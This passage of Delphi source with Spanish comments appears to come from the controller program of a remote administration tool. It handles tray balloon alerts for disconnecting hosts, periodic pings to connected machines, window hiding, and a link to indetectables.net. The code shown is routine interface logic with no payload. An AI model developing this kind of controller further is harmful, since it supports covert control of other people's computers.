    MessageDlg('CoolServer.dll no existe, no se podrán mandar servidores', mtWarning, [mbOK], 0);


end;
// para el globo emergente
procedure TFormMain.GloboEmergente(titulo:string;mensaje:string;tipo:cardinal);
begin
  TrayIconData.cbSize := SizeOf(TrayIconData);
  TrayIconData.uFlags := NIF_INFO;
  strPLCopy(TrayIconData.szInfo, Mensaje, SizeOf(TrayIconData.szInfo) - 1);
  TrayIconData.DUMMYUNIONNAME.uTimeout := 300;
  strPLCopy(TrayIconData.szInfoTitle, Titulo, SizeOf(TrayIconData.szInfoTitle) - 1);
  TrayIconData.dwInfoFlags := tipo;
  //NIIF_INFO;     //NIIF_ERROR;  //NIIF_WARNING;
  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
  {in my testing, the following code has no use}
  TrayIconData.DUMMYUNIONNAME.uVersion := NOTIFYICON_VERSION;
  Shell_NotifyIcon(NIM_SETVERSION, @TrayIconData);
end;

procedure TFormMain.NotiMsnDesconect(tItem: TListItem);
var
  Mensaje, Titulo: string;
  Item: TListItem;
begin
  item    := tItem;
  Mensaje := 'La IP es :' + Item.Caption;
  Titulo := Item.SubItems[buscaridcolumnapornombre(columnas[1])] + ' Desconectandose';
  GloboEmergente(Titulo,Mensaje,NIIF_ERROR);
end;

procedure TFormMain.FormShow(Sender: TObject);
begin
  
  if PrimeraVezQueMeMuestro then
  begin
    StatusBar.Panels[0].Text := 'Estado: No escuchando';
    LeerArchivoINI();
    PrimeraVezQueMeMuestro := False;
    if FormOpciones.CheckBoxEscucharAlIniciar.Checked then
      BtnEscuchar.Click;
    TimerMandarPing.Interval := strtointdef(FormOpciones.EditPingTimerInterval.Text, 30)*1000;
    TimerMandarPing.Enabled := FormOpciones.CheckBoxMandarPingAuto.Checked;
  end;

end;


procedure TFormMain.TrayMessage(var Msg: TMessage);
var
  p: TPoint;
begin
  case Msg.lParam of
    WM_LBUTTONDOWN:
    begin
      MostrarOcultar1.Click;
    end;
    WM_RBUTTONDOWN:
    begin
      SetForegroundWindow(Handle);
      GetCursorPos(p);
      PopUpMenuTray.Popup(p.x, p.y);
      PostMessage(Handle, WM_NULL, 0, 0);
    end;
  end;
end;



procedure TFormMain.MostrarOcultar1Click(Sender: TObject);
begin
  if FormMain.Visible then //Ocultar
    MinimizeToTrayClick(Sender) //En esa procedure se esconde la form
  else
  begin //Mostrar
    Application.Restore;  {restore the application}
    if WindowState = wsMinimized then
      WindowState := wsNormal;  {Reset minimized state}
    Visible := True;
    SetForegroundWindow(Application.Handle); {Force form to the foreground }
  end;
end;

procedure TFormMain.Salir1Click(Sender: TObject);
begin
  FormMain.OnCloseQuery := nil;
  Close;
end;

procedure TFormMain.NotificacinestiloMSN1Click(Sender: TObject);
begin
  FormOpciones.CheckBoxNotificacionMSN.Checked := not NotificacinestiloMSN1.Checked;
end;

procedure TFormMain.PopupMenuTrayPopup(Sender: TObject);
begin
  NotificacinestiloMSN1.Checked := FormOpciones.CheckBoxNotificacionMsn.Checked;
end;


procedure TFormMain.MinimizeToTrayClick(Sender: TObject);
begin
  Hide;
  {hide the taskbar button}
  if IsWindowVisible(Application.Handle) then
    ShowWindow(Application.Handle, SW_HIDE);
end;

procedure TFormMain.wwwindetectablesnet1Click(Sender: TObject);
begin
  ShellExecute(Handle, 'open', 'http://www.indetectables.net', '', '', SW_SHOW);
end;

procedure TFormMain.TimerMandarPingTimer(Sender: TObject);
var
  i:integer;
  AThread: TIdPeerThread;
begin //Mandar Ping cada 30 segundos
  for i:=0 to listviewconexiones.Items.Count-1 do
  begin
    if((ListViewConexiones.items[i].SubItems[buscaridcolumnapornombre(Columnas[5])] <> '.') and (ListViewConexiones.items[i].SubItems.Objects[0] <> nil) ) then //solo si no estamos mandando ping
    begin
      AThread := TidPeerThread(ListViewConexiones.items[i].SubItems.Objects[0]);
      AThread.Connection.WriteLn('PING');
      //Como objeto 2 guardamos una captura del tiempo en milisegundos
      ListViewConexiones.items[i].SubItems.Objects[2] := TObject(GetTickCount());
    end;
  end;
end;

procedure TFormMain.ListViewConexionesColumnRightClick(Sender: TObject;
  Column: TListColumn; Point: TPoint);
begin
FormColumnasManager.show;
end;

procedure TFormMain.PopupMenuConexionesPopup(Sender: TObject);
begin
  if FormColumnasManager.Showing then
    FormColumnasManager.FocusControl(nil);

end;

end.
